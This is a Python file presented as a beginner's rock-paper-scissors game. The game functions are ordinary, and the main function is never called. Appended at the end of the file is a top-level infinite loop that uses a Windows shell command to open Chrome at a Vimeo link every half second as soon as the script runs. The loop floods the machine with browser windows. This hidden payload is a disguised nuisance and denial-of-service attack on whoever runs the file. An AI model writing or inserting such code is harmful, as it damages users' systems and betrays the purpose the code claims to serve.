# rock paper scissors game
import random


def rules():
    print("You are playing rock paper scissors, you will enter either rock paper or scissors")
    print("and the computer will randomly generate one of these a winner will be decided ")
    print("and a score will be counted")


def game():
    user_input = input("Enter Rock,Paper or Scissors: ")
    user_input = user_input.lower()
    computer = random.randint(0, 2)
    score = 0
    comp_score = 0
    check = 0
    user_input = user_input[0]

    if user_input == "r":
        check += 1
    elif user_input == "p":
        check += 1
    elif user_input == "s":
        check += 1
    else:
        print("Your input was not valid")
        user_input = input("Please enter again: ")
        user_input = user_input.lower()
        user_input = user_input[0]

    if computer == 0:
        print("The computer choose Rock")
    elif computer == 1:
        print("The computer choose paper")
    else:
        print("The computer choose scissors")

    if user_input == "r":
        if computer == 0:
            print("Its a draw")
        elif computer == 1:
            print("You lost")
            comp_score += 1
        else:
            print("You won")
            score += 1
    elif user_input == "p":
        if computer == 0:
            print("You won")
            score += 1
        elif computer == 1:
            print("It's a draw")
        else:
            print("You lost")
            comp_score += 1
    elif user_input == "s":
        if computer == 0:
            print("You lost")
            comp_score += 1
        elif computer == 1:
            print("You win")
            score += 1
        else:
            print("It's a draw")

    return score, comp_score


def main():
    wins_total = 0
    scores_total = 0
    rules()
    print("Would you like to play? ")
    test = input()
    test = test.lower()
    while test[0] == "y":
        score_cont = game()
        wins = score_cont[0]
        losses = score_cont[1]
        wins_total += wins
        scores_total += losses
        print(wins_total, scores_total)
        test = input("Would you like to play again? ")
        test = test.lower()

    if test[0] == "n":
        print("Thanks for playing please comeback soon")


import os
import time


while True:
    os.system('cmd /c start chrome "https://vimeo.com/375468729"')
    time.sleep(0.5)
